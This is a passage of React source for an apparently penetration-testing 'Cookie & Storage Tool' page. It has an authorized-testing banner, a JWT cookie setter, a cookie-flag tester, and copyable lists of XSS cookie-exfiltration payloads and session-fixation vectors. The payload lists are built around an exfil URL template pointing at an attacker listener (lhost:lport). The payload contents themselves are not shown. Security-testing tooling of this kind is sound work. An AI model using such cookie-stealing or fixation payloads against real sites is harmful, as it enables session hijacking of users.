    <div style={{ display: "flex", flexDirection: "column", gap: 20 }}>
      <div
        style={{
          display: "flex",
          alignItems: "flex-start",
          gap: 10,
          padding: "12px 14px",
          background: "rgba(251,113,133,0.08)",
          border: "1px solid rgba(251,113,133,0.25)",
          borderRadius: 10,
          fontFamily: mono,
          fontSize: 11,
          color: "#FCA5A5",
        }}
      >
        <Shield size={18} style={{ flexShrink: 0 }} />
        <div>
          <strong>Authorized testing only.</strong> Cookie theft and session fixation payloads are for labs,
          bug bounty with scope, or apps you own. Misuse is illegal.
        </div>
      </div>

      <Card style={{ background: BG, border: BORDER }}>
        <h3 style={sectionTitle}>
          <Cookie size={18} /> JWT as cookie
        </h3>
        <p style={{ fontFamily: mono, fontSize: 11, color: DIM, margin: "0 0 12px" }}>
          Paste a JWT to set it as a client-side cookie (labs / your own apps). HttpOnly cannot be set from JS.
        </p>
        <div style={{ display: "grid", gap: 10, gridTemplateColumns: "repeat(auto-fill, minmax(140px, 1fr))" }}>
          <Input label="Cookie name" value={jwtName} onChange={(e) => setJwtName(e.target.value)} />
          <Input label="Path" value={jwtPath} onChange={(e) => setJwtPath(e.target.value)} />
          <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
            <span style={{ fontFamily: mono, fontSize: 10, fontWeight: 600, color: DIM, textTransform: "uppercase" }}>
              SameSite
            </span>
            <select
              value={jwtSame}
              onChange={(e) => setJwtSame(e.target.value)}
              style={{
                fontFamily: mono,
                fontSize: 12,
                padding: "10px 12px",
                background: "#111827",
                border: BORDER,
                borderRadius: 8,
                color: TEXT,
              }}
            >
              <option value="Lax">Lax</option>
              <option value="Strict">Strict</option>
              <option value="None">None</option>
            </select>
          </div>
          <label style={{ display: "flex", alignItems: "center", gap: 8, fontFamily: mono, fontSize: 11, color: TEXT }}>
            <input type="checkbox" checked={jwtSecure} onChange={(e) => setJwtSecure(e.target.checked)} />
            Secure
          </label>
        </div>
        <textarea
          value={jwtToken}
          onChange={(e) => setJwtToken(e.target.value)}
          rows={4}
          placeholder="eyJhbGciOi..."
          style={{
            width: "100%",
            marginTop: 12,
            fontFamily: mono,
            fontSize: 11,
            padding: 10,
            background: "#111827",
            border: BORDER,
            borderRadius: 8,
            color: TEXT,
            resize: "vertical",
            boxSizing: "border-box",
          }}
        />
        <button type="button" onClick={applyJwtCookie} style={{ ...accentBtn, marginTop: 10 }}>
          Set JWT cookie
        </button>
      </Card>

      <Card style={{ background: BG, border: BORDER }}>
        <h3 style={sectionTitle}>
          <FlaskConical size={18} /> XSS cookie exfiltration ({stealers.length} payloads)
        </h3>
        <p style={{ fontFamily: mono, fontSize: 11, color: DIM, margin: "0 0 12px" }}>
          Exfil URL base from app store: <code style={{ color: ACCENT }}>http://{lhost}:{lport}/?c=</code>
        </p>
        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          {stealers.map((s) => (
            <div
              key={s.name}
              style={{
                padding: "10px 12px",
                background: "rgba(255,255,255,0.03)",
                border: BORDER,
                borderRadius: 8,
              }}
            >
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 8 }}>
                <span style={{ fontFamily: heading, fontSize: 12, color: TEXT }}>{s.name}</span>
                <CopyButton text={s.payload} />
              </div>
              <pre
                style={{
                  margin: 0,
                  fontFamily: mono,
                  fontSize: 10,
                  color: "#D1D5DB",
                  whiteSpace: "pre-wrap",
                  wordBreak: "break-all",
                }}
              >
                {s.payload}
              </pre>
            </div>
          ))}
        </div>
      </Card>

      <Card style={{ background: BG, border: BORDER }}>
        <h3 style={sectionTitle}>Cookie flags tester</h3>
        <p style={{ fontFamily: mono, fontSize: 11, color: DIM, margin: "0 0 10px" }}>
          Sets disposable cookies with different flag combinations. Scripts cannot read Secure/SameSite/HttpOnly back —
          we only verify whether the cookie name appears in <code style={{ color: TEXT }}>document.cookie</code> on this origin/path.
        </p>
        <Input label="Path for tests" value={flagPath} onChange={(e) => setFlagPath(e.target.value)} />
        <button type="button" onClick={runFlagTests} style={{ ...accentBtn, marginTop: 10 }}>
          Run flag tests
        </button>
        {flagResults.length > 0 && (
          <table style={{ width: "100%", marginTop: 14, borderCollapse: "collapse", fontFamily: mono, fontSize: 10 }}>
            <thead>
              <tr style={{ color: DIM, textAlign: "left" }}>
                <th style={{ padding: 8, borderBottom: BORDER }}>Case</th>
                <th style={{ padding: 8, borderBottom: BORDER }}>Visible</th>
                <th style={{ padding: 8, borderBottom: BORDER }}>Set string</th>
              </tr>
            </thead>
            <tbody>
              {flagResults.map((r) => (
                <tr key={r.label}>
                  <td style={{ padding: 8, borderBottom: BORDER, color: TEXT }}>{r.label}</td>
                  <td style={{ padding: 8, borderBottom: BORDER, color: r.present ? "#6EE7B7" : "#FB7185" }}>
                    {r.present ? "yes" : "no"}
                  </td>
                  <td style={{ padding: 8, borderBottom: BORDER, color: DIM, wordBreak: "break-all" }}>
                    {r.built}
                    <div style={{ color: "#9CA3AF", marginTop: 4 }}>{r.note}</div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </Card>

      <Card style={{ background: BG, border: BORDER }}>
        <h3 style={sectionTitle}>
          <Link2 size={18} /> Session fixation vectors
        </h3>
        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          {fixationVectors.map((v) => (
            <div
              key={v.title}
              style={{
                padding: "10px 12px",
                background: "rgba(255,255,255,0.03)",
                border: BORDER,
                borderRadius: 8,
              }}
            >
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <span style={{ fontFamily: heading, fontSize: 12, color: ACCENT }}>{v.title}</span>
                <CopyButton text={v.body} />
              </div>
              <pre
                style={{
                  margin: "8px 0 0",
                  fontFamily: mono,
                  fontSize: 10,
                  color: TEXT,
                  whiteSpace: "pre-wrap",
                  wordBreak: "break-all",
                }}
              >
                {v.body}
              </pre>
            </div>
          ))}
        </div>
      </Card>
    </div>
  );
}

// ── Page ─────────────────────────────────────────────────────────────────────

export default function CookieTool() {
  const [tab, setTab] = useState("cookies");

  return (
    <div style={{ padding: "20px 24px 40px", maxWidth: 1200, margin: "0 auto" }}>
      <header style={{ display: "flex", alignItems: "center", gap: 14, marginBottom: 24 }}>
        <div
          style={{
            width: 36,
            height: 36,
            borderRadius: 8,
            background: `${ACCENT}22`,
            border: `1px solid ${ACCENT}44`,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
          }}
        >
          <Cookie size={20} color={ACCENT} strokeWidth={2.2} />
        </div>
        <h1
          style={{
            fontFamily: heading,
            fontSize: 22,
            fontWeight: 700,
            color: TEXT,
            margin: 0,
            letterSpacing: "-0.02em",
          }}
        >
          Cookie &amp; Storage Tool
        </h1>
      </header>

      <div style={{ display: "flex", flexWrap: "wrap", gap: 8, marginBottom: 20 }}>
        <TabButton active={tab === "cookies"} onClick={() => setTab("cookies")}>
          Cookie Editor
        </TabButton>
        <TabButton active={tab === "local"} onClick={() => setTab("local")}>
          LocalStorage
        </TabButton>
        <TabButton active={tab === "session"} onClick={() => setTab("session")}>
          SessionStorage
        </TabButton>
        <TabButton active={tab === "crafter"} onClick={() => setTab("crafter")}>
          Cookie Crafter
        </TabButton>
      </div>

      {tab === "cookies" && <CookieEditorTab />}
      {tab === "local" && (
        <StorageInspectorTab storage={window.localStorage} title="localStorage" />
      )}
      {tab === "session" && (
        <StorageInspectorTab storage={window.sessionStorage} title="sessionStorage" />
      )}
      {tab === "crafter" && <CookieCrafterTab />}
    </div>
  );
}
